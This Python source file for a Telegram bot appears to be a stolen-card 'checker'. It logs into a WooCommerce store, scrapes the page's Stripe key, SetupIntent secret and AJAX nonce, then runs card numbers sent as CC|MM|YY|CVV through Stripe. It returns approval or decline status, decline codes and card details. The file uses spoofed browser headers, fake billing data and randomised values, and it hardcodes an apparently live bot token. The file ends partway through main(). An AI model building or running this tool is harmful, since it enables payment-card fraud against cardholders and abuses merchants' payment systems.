import logging
import requests
import re
import json
import datetime
import random
from bs4 import BeautifulSoup
from telegram import Update, ForceReply
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode
from telegram.helpers import escape_markdown
import requests.utils 

BOT_TOKEN = "7879139068:AAEnfNrPBt-Zz8KD4kOLi6HcmFUY98MijQY" 

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

def get_general_headers(target_url=None, referer=None):
    authority = "example.com"
    if target_url:
        try:
            parsed_url = requests.utils.urlparse(target_url)
            authority = parsed_url.netloc if parsed_url.netloc else authority
        except Exception:
            logger.warning(f"Could not parse target_url {target_url} for authority, using default.")

    effective_referer = referer
    if not effective_referer and target_url:
        try:
            parsed_target_url = requests.utils.urlparse(target_url)
            effective_referer = f"{parsed_target_url.scheme}://{parsed_target_url.netloc}/"
        except Exception:
            effective_referer = "https://google.com"
    elif not effective_referer:
        effective_referer = "https://google.com"

    return {
        "authority": authority,
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "no-cache", "pragma": "no-cache",
        "sec-ch-ua": '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "document", "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin" if referer and authority in referer else "cross-site",
        "sec-fetch-user": "?1", "upgrade-insecure-requests": "1",
        "referer": effective_referer,
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    }

async def addsitelogin(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Send site login like:\n`https://yoursite.com/my-account/|youremail@example.com|yourpassword`",
        parse_mode=ParseMode.MARKDOWN_V2)
    context.user_data['next_action'] = 'handle_login_details'

async def handle_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('next_action') != 'handle_login_details':
        return await route_text_message(update, context, called_from_specific_handler=True)

    if not update.message.text or '|' not in update.message.text or update.message.text.count('|') != 2:
        await update.message.reply_text(
            "Invalid format\\. Send: `https://yoursite.com/my-account/|email|pass`",
            parse_mode=ParseMode.MARKDOWN_V2)
        context.user_data.pop('next_action', None)
        return

    full_url, login_identifier, pwd = map(str.strip, update.message.text.split('|', 2))
    session = requests.Session()

    await update.message.reply_text("Attempting to log in, please wait...")

    try:
        login_page_response = session.get(full_url, headers=get_general_headers(target_url=full_url), timeout=25)
        login_page_response.raise_for_status()
        login_page_text = login_page_response.text
        soup = BeautifulSoup(login_page_text, "html.parser")

        nonce = None
        nonce_selectors = [
            {"name": "woocommerce-login-nonce"}, {"id": "woocommerce-login-nonce"},
            {"name": "_wpnonce"}, {"id": "_wpnonce"},
            {"name": "csrf_token"}, {"name": "_token"}
        ]
        for selector in nonce_selectors:
            nonce_input = soup.find("input", selector)
            if nonce_input and nonce_input.get("value"):
                nonce = nonce_input["value"]
                logger.info(f"Login Nonce found using selector {selector}: {nonce[:10]}...")
                break
        if not nonce:
            script_nonce_patterns = [
                r'["\'](?:woocommerce-login-nonce|_wpnonce|csrf_token|_token)["\']\s*:\s*["\']([a-zA-Z0-9]+)["\']',
                r'name=["\'](?:woocommerce-login-nonce|_wpnonce|csrf_token|_token)["\']\svalue=["\']([a-zA-Z0-9]+)["\']'
            ]
            for pattern in script_nonce_patterns:
                script_nonce_match = re.search(pattern, login_page_text)
                if script_nonce_match:
                    nonce = script_nonce_match.group(1)
                    logger.info(f"Login Nonce found using script regex: {nonce[:10]}...")
                    break
        if not nonce: logger.warning(f"Login nonce not found on {full_url}.")

        form_action_url = full_url
        login_form = soup.find("form", {"id": "loginform"}) or \
                     soup.find("form", class_=re.compile(r".*(login|signin|account).*form.*", re.I)) or \
                     soup.find("form", action=re.compile(r".*login.*", re.I))

        if login_form and login_form.get("action"):
            form_action_url = requests.utils.urljoin(full_url, login_form.get("action"))
            logger.info(f"Login form action URL: {form_action_url}")
        else: logger.warning(f"Could not determine specific login form action URL, using original URL: {full_url}")

        username_fields = ["log", "username", "email", "user_login", "user[email]", "session[email_or_username]"]
        password_fields = ["pwd", "password", "user_password", "user[password]", "session[password]"]
        data = {"redirect_to": full_url, "testcookie": "1"}

        found_user_field, found_pass_field = False, False
        for u_field in username_fields:
            if soup.find("input", {"name": u_field}): data[u_field] = login_identifier; found_user_field = True; break
        if not found_user_field: data["username"] = login_identifier

        for p_field in password_fields:
            if soup.find("input", {"name": p_field}): data[p_field] = pwd; found_pass_field = True; break
        if not found_pass_field: data["password"] = pwd

        if nonce:
            nonce_input_field = soup.find("input", {"value": nonce})
            if nonce_input_field and nonce_input_field.get("name"):
                data[nonce_input_field.get("name")] = nonce
            else:
                for n_name in ["woocommerce-login-nonce", "_wpnonce", "csrf_token", "_token", "nonce"]:
                    if soup.find("input", {"name": n_name}): data[n_name] = nonce; break
                else: data["_wpnonce"] = nonce

        submit_buttons = soup.find_all("button", {"type": "submit"}) + soup.find_all("input", {"type": "submit"})
        for btn in submit_buttons:
            if btn.get("name"): data[btn.get("name")] = btn.get("value", "Log In"); break
        else: data.setdefault("wp-submit", "Log In")


        login_post_referer = full_url
        logger.info(f"Attempting POST to {form_action_url} with data keys: {list(data.keys())}")
        login_response = session.post(
            form_action_url, data=data, headers=get_general_headers(target_url=form_action_url, referer=login_post_referer),
            allow_redirects=True, timeout=25
        )
        login_response.raise_for_status()
        login_response_text_lower = login_response.text.lower()

        login_successful = False
        logout_keywords = ["logout", "log out", "sign out", "sign-out", "customer/account/logout", "wp-login.php?action=logout"]
        dashboard_keywords = ["dashboard", "my account", "order history", "account details", "your profile"]

        if any(keyword in login_response_text_lower for keyword in logout_keywords): login_successful = True
        elif hasattr(login_response, 'url') and any(keyword in login_response.url.lower() for keyword in (dashboard_keywords + logout_keywords)): login_successful = True
        elif any(keyword in login_response_text_lower for keyword in dashboard_keywords): login_successful = True

        error_messages_on_page = [
            "incorrect username or password", "unknown username", "invalid username", "invalid password",
            "error", "the password you entered is incorrect", "authentication failed",
            "too many failed login attempts", "invalid login credentials", "lost your password?"
        ]
        if login_successful and any(err_msg in login_response_text_lower for err_msg in error_messages_on_page):
            logger.warning(f"Potential false positive login for {login_identifier} due to error message. Checking further.")
            current_page_soup = BeautifulSoup(login_response.text, "html.parser")
            if current_page_soup.find("form", {"id": "loginform"}) or \
               current_page_soup.find("form", class_=re.compile(r".*login.*form.*", re.I)):
                login_successful = False

        if not login_successful:
            if any(err_msg in login_response_text_lower for err_msg in error_messages_on_page):
                login_successful = False
            else:
                logger.warning(f"Login status ambiguous for {login_identifier}. No clear success or error indicators. Final URL: {login_response.url}. Assuming failure for safety.")
                login_successful = False


        if not login_successful:
            error_message_soup = BeautifulSoup(login_response.text, "html.parser")
            error_element = error_message_soup.find(class_=re.compile(r".*(error|alert|message|notice|warning).*", re.I)) or \
                            error_message_soup.find(id=re.compile(r".*(error|alert|message|notice|warning).*", re.I))
            error_text = error_element.get_text(strip=True) if error_element else "Login failed. Check credentials/URL. No specific error found on page."
            await update.message.reply_text(f"Login failed. Site says: {error_text[:300]}")
            logger.info(f"Login failed for {login_identifier} on {full_url}. Final URL: {login_response.url}, Status: {login_response.status_code}")
            context.user_data.pop('next_action', None)
            return

        context.user_data['session'] = session
        parsed_login_url = requests.utils.urlparse(full_url)
        context.user_data['base_url'] = f"{parsed_login_url.scheme}://{parsed_login_url.netloc}"
        context.user_data['current_site_url'] = login_response.url
        context.user_data['login_identifier'] = login_identifier

        context.user_data['next_action'] = 'handle_payment_url'
        await update.message.reply_text(
            "Login successful\\! Now send the *exact* URL of the 'Add Payment Method' page "
            "\\(or checkout page where Stripe form is present\\):",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    except requests.exceptions.HTTPError as e:
        err_msg_text = f"HTTP Error during login: {e.response.status_code} - {e}."
        if hasattr(e.response, 'text') and e.response.text: err_msg_text += f"\nResponse: {e.response.text[:200]}"
        await update.message.reply_text(err_msg_text)
    except requests.exceptions.Timeout:
        await update.message.reply_text(f"The request timed out while trying to log in to {full_url}.")
    except requests.exceptions.RequestException as e:
        await update.message.reply_text(f"Network error during login: {e}")
    except Exception as e:
        logger.exception(f"Unexpected error (login {full_url})")
        await update.message.reply_text(f"An unexpected error occurred during login: {str(e)}")
    finally:
        if not context.user_data.get('session'):
            context.user_data.pop('next_action', None)


async def handle_add_payment(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.get('next_action') != 'handle_payment_url':
        return await route_text_message(update, context, called_from_specific_handler=True)

    payment_page_url = update.message.text.strip()
    if not payment_page_url.lower().startswith("http"):
        await update.message.reply_text("Invalid URL. Please send a full URL (e.g., https://...).")
        return

    session = context.user_data.get("session")
    base_url = context.user_data.get("base_url")
    if not session or not base_url:
        await update.message.reply_text("Login session or base URL missing. Please use /addsitelogin first.")
        context.user_data.pop('next_action', None)
        return

    await update.message.reply_text("Fetching payment page details, please wait...")
    current_site_url_for_referer = context.user_data.get('current_site_url', payment_page_url)

    try:
        page_response = session.get(payment_page_url, headers=get_general_headers(target_url=payment_page_url, referer=current_site_url_for_referer), timeout=20)
        page_response.raise_for_status()
        page_content = page_response.text
        context.user_data['current_site_url'] = page_response.url
    except Exception as e:
        logger.error(f"Failed to fetch payment page {payment_page_url}: {e}")
        await update.message.reply_text(f"Failed to fetch payment page: {e}")
        return

    stripe_pk, stripe_client_secret, wc_ajax_nonce, api_type = None, None, None, None
    wc_true_ajax_url = None

    pk_patterns = [
        r"Stripe\s*\(\s*['\"](pk_(?:live|test)_[a-zA-Z0-9]+)['\"]\s*\)",
        r"""['"](pk_(?:live|test)_[a-zA-Z0-9]+)['"]""",
        r"""\b(pk_(?:live|test)_[a-zA-Z0-9]{20,})\b"""
    ]
    for pattern in pk_patterns:
        match = re.search(pattern, page_content)
        if match: stripe_pk = match.group(1); logger.info(f"Stripe PK found: {stripe_pk[:12]}..."); break
    if not stripe_pk: logger.warning(f"Stripe PK not found on {payment_page_url}.")

    soup_payment_page = BeautifulSoup(page_content, "html.parser")
    wc_script_tag = soup_payment_page.find('script', {'id': 'wc-stripe-upe-classic-js-extra'})
    if wc_script_tag and wc_script_tag.string:
        nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"([a-zA-Z0-9]+)"', wc_script_tag.string)
        if nonce_match:
            wc_ajax_nonce = nonce_match.group(1)
            api_type = "setup_intent"
            wc_true_ajax_url = f"{base_url}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
            logger.info(f"WooCommerce AJAX Nonce found: {wc_ajax_nonce}. AJAX URL: {wc_true_ajax_url}")

    si_secret_pattern = r"""['"]?(seti_[a-zA-Z0-9]+_secret_[a-zA-Z0-9]+)['"]?"""
    si_match = re.search(si_secret_pattern, page_content)
    if si_match:
        stripe_client_secret = si_match.group(1)
        if not api_type : api_type = "setup_intent"
        logger.info(f"Stripe SetupIntent client_secret (regex) found: {stripe_client_secret[:15]}...")
    else:
        secret_element = soup_payment_page.find(attrs={"data-client-secret": re.compile(r"seti_.*_secret_.*")})
        if secret_element:
            potential_secret = secret_element.get("data-client-secret")
            if potential_secret and "seti_" in potential_secret:
                stripe_client_secret = potential_secret
                if not api_type : api_type = "setup_intent"
                logger.info(f"Stripe SetupIntent client_secret (data-attr) found: {stripe_client_secret[:15]}...")
        else:
            for script_tag_content in soup_payment_page.find_all("script"):
                if script_tag_content.string:
                    si_script_match = re.search(si_secret_pattern, script_tag_content.string)
                    if si_script_match:
                        stripe_client_secret = si_script_match.group(1)
                        if not api_type : api_type = "setup_intent"
                        logger.info(f"Stripe SetupIntent client_secret (script content) found: {stripe_client_secret[:15]}..."); break

    if not stripe_client_secret and wc_ajax_nonce:
        logger.warning("WC AJAX Nonce found, but no accompanying SetupIntent client_secret (seti_...). Fallback to direct API will not be possible if WC AJAX fails.")
    elif not stripe_client_secret and not wc_ajax_nonce:
        logger.warning(f"Neither WC AJAX nonce nor Stripe SetupIntent client_secret found on {payment_page_url}.")


    if not api_type:
        if stripe_pk and any(js_indicator in page_content.lower() for js_indicator in ["stripe.js", "js.stripe.com/v3", "stripe.elements"]):
            api_type = "payment_method"
            logger.info("Generic Stripe page detected (PK and JS elements found, but no SetupIntent specific markers).")
        else:
            logger.warning(f"Could not determine specific Stripe API type for {payment_page_url}.")
            api_type = "unknown"

    context.user_data.update({
        'stripe_pk': stripe_pk,
        'stripe_type': api_type,
        'stripe_client_secret': stripe_client_secret,
        'wc_ajax_nonce': wc_ajax_nonce,
        'wc_true_ajax_url': wc_true_ajax_url,
        'payment_page_url': payment_page_url
    })

    reply_parts = ["Stripe Info Updated:"]
    pk_display = stripe_pk if stripe_pk else 'Not Found'
    reply_parts.append(f"PK: `{escape_markdown(pk_display, version=2)}`")
    reply_parts.append(f"Detected Type: `{escape_markdown(str(api_type), version=2)}`")

    if wc_ajax_nonce:
        reply_parts.append(f"WooCommerce AJAX Nonce: `{escape_markdown(wc_ajax_nonce, version=2)}` \\(Will use WC AJAX URL: `{escape_markdown(str(wc_true_ajax_url), version=2)}`\\)")
    if stripe_client_secret:
        secret_display = stripe_client_secret[:15] + '...' if stripe_client_secret else 'N/A'
        reply_parts.append(f"SetupIntent Client Secret: `{escape_markdown(secret_display, version=2)}` \\(Fallback/Direct API\\)")


    if api_type != "setup_intent":
        reply_parts.append("\nWARNING: Page does not appear to be a Stripe SetupIntent page suitable for /chk\\.")
    elif not stripe_pk:
        reply_parts.append("\nWARNING: Stripe PK not found\\. Cannot proceed with /chk\\.")
    elif not wc_ajax_nonce and not stripe_client_secret:
        reply_parts.append("\nWARNING: Critical info for SetupIntent \\(WC AJAX Nonce or Client Secret\\) missing\\. Cannot proceed with /chk\\.")
    elif wc_ajax_nonce and not wc_true_ajax_url :
        reply_parts.append("\nWARNING: WC AJAX Nonce found, but AJAX URL could not be constructed\\. Fallback to direct API will be attempted if Client Secret exists\\.")


    await update.message.reply_text("\n".join(reply_parts), parse_mode=ParseMode.MARKDOWN_V2)
    context.user_data['next_action'] = 'awaiting_chk_command'

async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        card_details_str = ""
        if not update.message.text:
            await update.message.reply_text("Provide card details: /chk CC|MM|YY|CVV")
            return

        command_text_to_check = update.message.text.strip()
        if command_text_to_check.lower().startswith("/chk "):
            card_details_str = command_text_to_check[len("/chk "):].strip()
        elif '|' in command_text_to_check and command_text_to_check.count('|') == 3 and context.user_data.get('next_action') == 'awaiting_chk_command':
            card_details_str = command_text_to_check
        else:
            await update.message.reply_text("Invalid /chk format. Send: /chk CC|MM|YY|CVV")
            return

        if not card_details_str or card_details_str.count('|') != 3:
            await update.message.reply_text("Invalid card format: CC|MM|YY|CVV")
            return

        cc, mm_str, yy_raw, cvv_str = map(str.strip, card_details_str.split('|'))
        exp_year_str = f"20{yy_raw}" if len(yy_raw) == 2 else yy_raw

        current_year = datetime.date.today().year
        if not (cc.isdigit() and 13 <= len(cc) <= 19 and
                mm_str.isdigit() and 1 <= int(mm_str) <= 12 and
                exp_year_str.isdigit() and len(exp_year_str) == 4 and int(exp_year_str) >= current_year and
                cvv_str.isdigit() and 3 <= len(cvv_str) <= 4):
            await update.message.reply_text("Invalid card details. Please check and try again.")
            return

        stripe_pk = context.user_data.get("stripe_pk")
        stripe_type = context.user_data.get("stripe_type")
        stripe_client_secret = context.user_data.get("stripe_client_secret")
        wc_ajax_nonce = context.user_data.get("wc_ajax_nonce")
        wc_true_ajax_url = context.user_data.get("wc_true_ajax_url")
        payment_page_url = context.user_data.get("payment_page_url", "https://example.com")
        session = context.user_data.get("session")
        login_identifier_for_billing = context.user_data.get('login_identifier', 'test@example.com')


        if stripe_type != "setup_intent":
            await update.message.reply_text(
                f"This bot is configured for Stripe SetupIntents for /chk. Detected type: '{escape_markdown(str(stripe_type if stripe_type else 'Unknown'),version=2)}'. Please use a SetupIntent page."
            )
            return

        if not stripe_pk:
            await update.message.reply_text("Stripe PK missing. Cannot create PaymentMethod. Re-scan payment page."); return
        if not session:
            await update.message.reply_text("User session not found. Please /addsitelogin again."); return
        if not (wc_ajax_nonce and wc_true_ajax_url) and not stripe_client_secret:
            await update.message.reply_text("Cannot confirm SetupIntent: Missing WooCommerce AJAX details AND Stripe Client Secret. Re-scan page."); return


        await update.message.reply_text("Creating PaymentMethod with Stripe...")

        pm_creation_headers = {
            "Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded",
            "Authorization": f"Bearer {stripe_pk}", "User-Agent": get_general_headers()["user-agent"]
        }
        pm_common_data = {
            "type": "card", "card[number]": cc, "card[cvc]": cvv_str,
            "card[exp_month]": mm_str, "card[exp_year]": exp_year_str,
            "billing_details[name]": "John Doe",
            "billing_details[email]": login_identifier_for_billing,
            "billing_details[address][line1]": "123 Main St",
            "billing_details[address][city]": "Anytown",
            "billing_details[address][state]": "CA",
            "billing_details[address][postal_code]": str(random.randint(10000, 99999)),
            "billing_details[address][country]": "US",
            "guid": "NA", "muid": "NA", "sid": "NA",
            "payment_user_agent": f"stripe.js/{context.bot_data.get('stripe_js_version', 'v3_bot_custom')}",
            "time_on_page": str(context.bot_data.get('time_on_page', random.randint(10000, 20000)))
        }

        pm_creation_response = requests.post("https://api.stripe.com/v1/payment_methods",
            headers=pm_creation_headers, data=pm_common_data, timeout=30)

        if pm_creation_response.status_code >= 400:
            try: pm_err_json = pm_creation_response.json(); err_detail = pm_err_json.get('error',{}).get('message', 'PM creation failed.')
            except json.JSONDecodeError: err_detail = f"PM creation failed (HTTP {pm_creation_response.status_code}, non-JSON)."
            logger.error(f"PM Creation Error: {err_detail} - Resp: {pm_creation_response.text[:300]}")
            await update.message.reply_text(f"Error creating PaymentMethod: {err_detail}"); return

        created_pm_json = pm_creation_response.json()
        created_pm_id = created_pm_json.get("id")
        if not created_pm_id:
            logger.error(f"PaymentMethod created but no ID returned: {created_pm_json}")
            await update.message.reply_text("PaymentMethod created but no ID found."); return

        logger.info(f"PaymentMethod created: {created_pm_id}")
        escaped_pm_id_for_msg = escape_markdown(str(created_pm_id), version=2)
        await update.message.reply_text(f"PaymentMethod `{escaped_pm_id_for_msg}` created\\.", parse_mode=ParseMode.MARKDOWN_V2)

        confirmation_response = None
        confirmation_method_used = None

        if wc_ajax_nonce and wc_true_ajax_url:
            confirmation_method_used = "WooCommerce AJAX"
            await update.message.reply_text(f"Attempting SetupIntent confirmation via {escape_markdown(confirmation_method_used, version=2)} ({escape_markdown(wc_true_ajax_url, version=2)})...") 

            wc_ajax_headers = {
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', 'Accept': '*/*',
                'X-Requested-With': 'XMLHttpRequest', 'Referer': payment_page_url,
                'User-Agent': get_general_headers()["user-agent"],
                'Origin': requests.utils.urlparse(payment_page_url).scheme + "://" + requests.utils.urlparse(payment_page_url).netloc
            }
            wc_ajax_payload = {
                'action': 'wc_stripe_create_and_confirm_setup_intent',
                'wc-stripe-payment-method': created_pm_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': wc_ajax_nonce,
                'email': login_identifier_for_billing,
            }
            logger.info(f"POSTing to WC AJAX ({wc_true_ajax_url}) with Nonce: {wc_ajax_nonce}, PM: {created_pm_id}")
            confirmation_response = session.post(wc_true_ajax_url, data=wc_ajax_payload, headers=wc_ajax_headers, timeout=30)

        elif stripe_client_secret:
            confirmation_method_used = "Direct Stripe API"
            await update.message.reply_text(f"No WC AJAX details or it failed. Attempting confirmation via {escape_markdown(confirmation_method_used, version=2)}...")

            intent_id = stripe_client_secret.split('_secret_')[0]
            direct_confirm_url = f"https://api.stripe.com/v1/setup_intents/{intent_id}/confirm"
            direct_confirm_payload = {
                "payment_method": created_pm_id,
                "client_secret": stripe_client_secret,
                "return_url": f"{requests.utils.urlparse(payment_page_url).scheme}://{requests.utils.urlparse(payment_page_url).netloc}/stripe_return_placeholder"
            }
            direct_confirm_headers = {
                "Accept": "application/json", "Content-Type": "application/x-www-form-urlencoded",
                "Authorization": f"Bearer {stripe_pk}", "User-Agent": get_general_headers()["user-agent"]
            }
            logger.info(f"POSTing to Direct Stripe API: {direct_confirm_url} with PM {created_pm_id}")
            confirmation_response = requests.post(direct_confirm_url, headers=direct_confirm_headers, data=direct_confirm_payload, timeout=30)
        else:
            await update.message.reply_text("Cannot confirm SetupIntent: All methods failed or no valid details."); return

        if confirmation_response is not None:
            status_code = confirmation_response.status_code
            result_json_data = {}
            raw_text_response = confirmation_response.text
            escaped_conf_method = escape_markdown(str(confirmation_method_used), version=2)
            result_message = f"Result from {escaped_conf_method} \\(HTTP {status_code}\\):\n" 
            json_decode_error_occurred = False

            try:
                result_json_data = confirmation_response.json()
            except json.JSONDecodeError:
                json_decode_error_occurred = True
                result_message += "Response was not valid JSON\\." 
                logger.error(f"{confirmation_method_used} JSON Decode Error. Status: {status_code}, Text: {raw_text_response[:300]}")
                result_json_data = {
                    "error_source": "json_decode", "message": "Server returned non-JSON response.",
                    "status_code": status_code, "raw_response_snippet": raw_text_response[:200]
                }

            if confirmation_method_used == "WooCommerce AJAX":
                if json_decode_error_occurred:
                    pass
                elif isinstance(result_json_data, dict):
                    success_url_indicator = 'payment-methods' in confirmation_response.url and status_code in [200, 301, 302]
                    if result_json_data.get('success') is True or success_url_indicator:
                        raw_status_from_wc = result_json_data.get('data', {}).get('status', 'succeeded (inferred)')
                        raw_intent_id_from_wc = result_json_data.get('data', {}).get('id', 'N/A')
                        escaped_status_wc = escape_markdown(str(raw_status_from_wc), version=2)
                        escaped_intent_id_wc = escape_markdown(str(raw_intent_id_from_wc), version=2)
                        result_message += f"✅ WooCommerce AJAX reports SUCCESS\\.\nIntent ID \\(from WC data\\): `{escaped_intent_id_wc}` Status: `{escaped_status_wc}`"
                        if success_url_indicator: result_message += "\n\\(Redirected to payment methods page\\)"
                        logger.info(f"WooCommerce AJAX Success: {result_json_data}")
                    elif result_json_data.get('success') is False:
                        error_data = result_json_data.get('data', [])
                        raw_wc_error_message = "Declined/Error."
                        if isinstance(error_data, list) and error_data and isinstance(error_data[0], dict):
                            raw_wc_error_message = error_data[0].get('message', "Unknown error from WC AJAX.")
                        elif isinstance(error_data, str): raw_wc_error_message = error_data
                        elif isinstance(error_data, dict):
                            raw_wc_error_message = error_data.get('message', json.dumps(error_data))
                        escaped_wc_error_text = escape_markdown(raw_wc_error_message, version=2)
                        result_message += f"❌ WooCommerce AJAX reports FAILURE: {escaped_wc_error_text}"
                        logger.warning(f"WooCommerce AJAX Failure: {raw_wc_error_message} - JSON: {result_json_data}")
                    else:
                        result_message += "❓ Ambiguous dictionary response from WooCommerce AJAX \\(no 'success' field or redirect\\)\\." 
                        logger.warning(f"WooCommerce AJAX Ambiguous Dict Response: {result_json_data}")
                else:
                    raw_type_info = str(type(result_json_data))
                    escaped_raw_type_info = escape_markdown(raw_type_info, version=2)
                    result_message += f"❓ Unexpected non\\-dictionary JSON response from WooCommerce AJAX \\(Type: {escaped_raw_type_info}\\)\\." 
                    logger.warning(f"WooCommerce AJAX returned non-dictionary JSON: Type {raw_type_info}, Value: {str(result_json_data)[:100]}. Raw text: {raw_text_response[:200]}")
                    result_json_data = {
                        "error_source": "unexpected_json_type_wc_ajax",
                        "message": "WooCommerce AJAX returned a non-dictionary JSON response.",
                        "response_type": raw_type_info,
                        "response_value_snippet": str(result_json_data)[:200],
                        "raw_response_snippet": raw_text_response[:200]
                    }


            elif confirmation_method_used == "Direct Stripe API":
                if json_decode_error_occurred:
                    pass
                elif isinstance(result_json_data, dict):
                    if 'error' in result_json_data:
                        err = result_json_data['error']
                        raw_err_message = err.get('message','Unknown Stripe API Error')
                        msg = f"❌ Stripe API Error: {escape_markdown(raw_err_message, version=2)}"
                        raw_decline_code = err.get('decline_code')
                        if raw_decline_code: msg += f"\nDecline Code: `{escape_markdown(str(raw_decline_code), version=2)}`"
                        if err.get('setup_intent') and isinstance(err.get('setup_intent'), dict):
                            si_err = err['setup_intent']
                            raw_si_err_id = si_err.get('id')
                            raw_si_err_status = si_err.get('status')
                            msg += f"\nFailed Intent ID: `{escape_markdown(str(raw_si_err_id), version=2)}` Status: `{escape_markdown(str(raw_si_err_status), version=2)}`"
                            if si_err.get('last_setup_error') and si_err['last_setup_error'].get('message'):
                                raw_last_err_msg = si_err['last_setup_error']['message']
                                msg += f"\nLast Error: `{escape_markdown(raw_last_err_msg, version=2)}`"
                        result_message += msg
                        logger.warning(f"Direct Stripe API Error: {raw_err_message} - JSON: {result_json_data}")
                    else:
                        raw_item_id = result_json_data.get('id', 'N/A')
                        raw_item_status = result_json_data.get('status', 'N/A')
                        result_message += f"Stripe API Result:\nID: `{escape_markdown(str(raw_item_id), version=2)}`\nStatus: `{escape_markdown(str(raw_item_status), version=2)}`"
                        pm_info = result_json_data.get('payment_method_details', {}).get('card', {}) or \
                                  result_json_data.get('payment_method', {}).get('card', {})
                        if pm_info.get('last4'):
                            brand = escape_markdown(str(pm_info.get('brand','N/A')).capitalize(), version=2)
                            last4 = escape_markdown(str(pm_info.get('last4','****')), version=2)
                            funding = escape_markdown(str(pm_info.get('funding','N/A')), version=2)
                            country = escape_markdown(str(pm_info.get('country','N/A')), version=2)
                            result_message += f"\nCard: {brand} `****{last4}` \\({funding}\\) \\- {country}" 
                        status_map = {
                            "succeeded": "\n✅ SetupIntent successful\\.", "requires_payment_method": "\n❌ Card declined\\.",
                            "requires_action": "\n⏳ Needs customer action \\(e\\.g\\., 3DS\\)\\.", "processing": "\n⏳ Processing\\."
                        }
                        result_message += status_map.get(str(raw_item_status), f"\nℹ️ Status: {escape_markdown(str(raw_item_status), version=2)}")
                        logger.info(f"Direct Stripe API Success: ID {raw_item_id}, Status {raw_item_status}")
                else:
                    raw_type_info_stripe = str(type(result_json_data))
                    escaped_raw_type_info_stripe = escape_markdown(raw_type_info_stripe, version=2)
                    result_message += f"❓ Unexpected non\\-dictionary JSON response from Direct Stripe API \\(Type: {escaped_raw_type_info_stripe}\\)\\."
                    logger.error(f"Direct Stripe API returned non-dictionary JSON: Type {raw_type_info_stripe}, Value: {str(result_json_data)[:100]}. Raw text: {raw_text_response[:200]}")
                    result_json_data = {
                        "error_source": "unexpected_json_type_stripe_api",
                        "message": "Direct Stripe API returned a non-dictionary JSON response.",
                        "response_type": raw_type_info_stripe,
                        "response_value_snippet": str(result_json_data)[:200],
                        "raw_response_snippet": raw_text_response[:200]
                    }

            json_dump_str = json.dumps(result_json_data, indent=2, ensure_ascii=False)
            
            final_reply_text = f"{result_message}\n\nRaw Confirm Intent Response \\({escaped_conf_method}\\):\n```json\n{json_dump_str[:3000]}\n```"
            await update.message.reply_text(final_reply_text, parse_mode=ParseMode.MARKDOWN_V2)
        else:
            await update.message.reply_text("Internal error: Confirmation response object was not created.");
            logger.error("No confirmation_response object in chk.")

    except requests.exceptions.Timeout:
        logger.error("Network request timed out during /chk.");
        await update.message.reply_text("Error: Network request timed out.")
    except requests.exceptions.RequestException as e:
        logger.error(f"Network connection error during /chk: {e}");
        await update.message.reply_text(f"Error connecting: {e}")
    except Exception as e:
        logger.exception("Unhandled error in chk function");
        
        await update.message.reply_text(f"An unexpected error occurred: {str(e)}")


async def route_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE, called_from_specific_handler=False):
    next_action = context.user_data.get('next_action')
    message_text = update.message.text.strip() if update.message and update.message.text else ""

    async def send_reply(text_to_send, use_markdown=True):
        try:
            if use_markdown:
                await update.message.reply_text(text_to_send, parse_mode=ParseMode.MARKDOWN_V2)
            else:
                await update.message.reply_text(text_to_send)
        except Exception as md_err:
            logger.warning(f"MarkdownV2 parsing error for: {text_to_send}. Sending as plain. Error: {md_err}")
            try:
                await update.message.reply_text(text_to_send)
            except Exception as plain_err:
                logger.error(f"Failed to send even plain text reply after Markdown error. Error: {plain_err}")


    if called_from_specific_handler:
        if next_action == 'handle_login_details': await send_reply("Expecting login: `URL|email|pass`\\.")
        elif next_action == 'handle_payment_url': await send_reply("Expecting a payment page URL\\.")
        elif next_action == 'awaiting_chk_command':
            if not (message_text.lower().startswith("/chk ") or ('|' in message_text and message_text.count('|') == 3)):
                await send_reply("Ready for `/chk CC|MM|YY|CVV` or use /addsitelogin to start over\\.")
        else:
            if '|' in message_text and message_text.count('|') == 2:
                context.user_data['next_action'] = 'handle_login_details'; return await handle_login(update, context)
            await send_reply("I'm not sure what to do\\. Try /start or /addsitelogin\\.")
        return

    if next_action == 'handle_login_details': await handle_login(update, context)
    elif next_action == 'handle_payment_url': await handle_add_payment(update, context)
    elif next_action == 'awaiting_chk_command':
        if '|' in message_text and message_text.count('|') == 3 and not message_text.lower().startswith("/chk"):
            return await chk(update, context)
        elif not message_text.lower().startswith("/chk ") and not ('|' in message_text and message_text.count('|') == 3) :
            await send_reply("Ready for card details `CC|MM|YY|CVV` \\(or use `/chk CC|MM|YY|CVV`\\)\\. Or /addsitelogin to restart\\.") 
        elif message_text.lower().startswith("/chk "):
             await send_reply("Please ensure you send card details after the /chk command, e\\.g\\., `/chk 123...`")

    else:
        if '|' in message_text and message_text.count('|') == 2:
            context.user_data['next_action'] = 'handle_login_details'; await handle_login(update, context)
        elif '|' in message_text and message_text.count('|') == 3:
            await send_reply("Please use /addsitelogin first, then provide payment page URL, before sending card details for /chk\\.")
        else: await send_reply("Unknown command or unexpected message\\. Try /start or /addsitelogin\\.")


def main():
    application = Application.builder().token(BOT_TOKEN).build()
